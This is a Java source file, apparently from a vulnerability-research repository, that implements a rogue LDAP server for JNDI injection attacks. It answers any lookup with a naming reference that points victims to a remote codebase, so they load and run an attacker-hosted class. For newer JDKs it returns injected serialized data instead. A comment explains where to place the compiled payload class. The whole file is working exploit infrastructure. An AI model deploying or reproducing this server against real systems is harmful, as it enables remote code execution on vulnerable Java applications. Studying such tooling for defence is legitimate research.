package com.threedr3am.bug.common.server;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

/**
 * LDAP server
 *
 * @author threedr3am
 */
public class LdapServer {

  private static final String LDAP_BASE = "dc=example,dc=com";
  public static byte[] classData;

  public static void main(String[] args) {
    run(args);
  }

  public static void run(String ... args) {
    int port = args.length > 0 ? Integer.parseInt(args[0]) : 43658;
    //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
    String url = args.length > 0 ? args[1] : "http://localhost/#Calc";
    try {
      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
      config.setListenerConfigs(new InMemoryListenerConfig(
          "listen", //$NON-NLS-1$
          InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
          port,
          ServerSocketFactory.getDefault(),
          SocketFactory.getDefault(),
          (SSLSocketFactory) SSLSocketFactory.getDefault()));

      config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
      System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
      ds.startListening();

    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static class OperationInterceptor extends InMemoryOperationInterceptor {

    private URL codebase;


    /**
     *
     */
    public OperationInterceptor(URL cb) {
      this.codebase = cb;
    }


    /**
     * {@inheritDoc}
     *
     * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
     */
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
      String base = result.getRequest().getBaseDN();
      Entry e = new Entry(base);
      try {
        sendResult(result, base, e);
      } catch (Exception e1) {
        e1.printStackTrace();
      }

    }


    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
        throws LDAPException, MalformedURLException {
      URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(""));
      System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
      e.addAttribute("javaClassName", "Calc");
      String cbstring = this.codebase.toString();
      int refPos = cbstring.indexOf('#');
      if (refPos > 0) {
        cbstring = cbstring.substring(0, refPos);
      }
      if (classData == null) {
        //todo <= jdk8u191
        e.addAttribute("javaCodeBase", cbstring);
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        e.addAttribute("javaFactory", this.codebase.getRef());
      } else {
        //todo > jdk8u191
        e.addAttribute("javaSerializedData", classData);
      }
      result.sendSearchEntry(e);
      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

  }
}
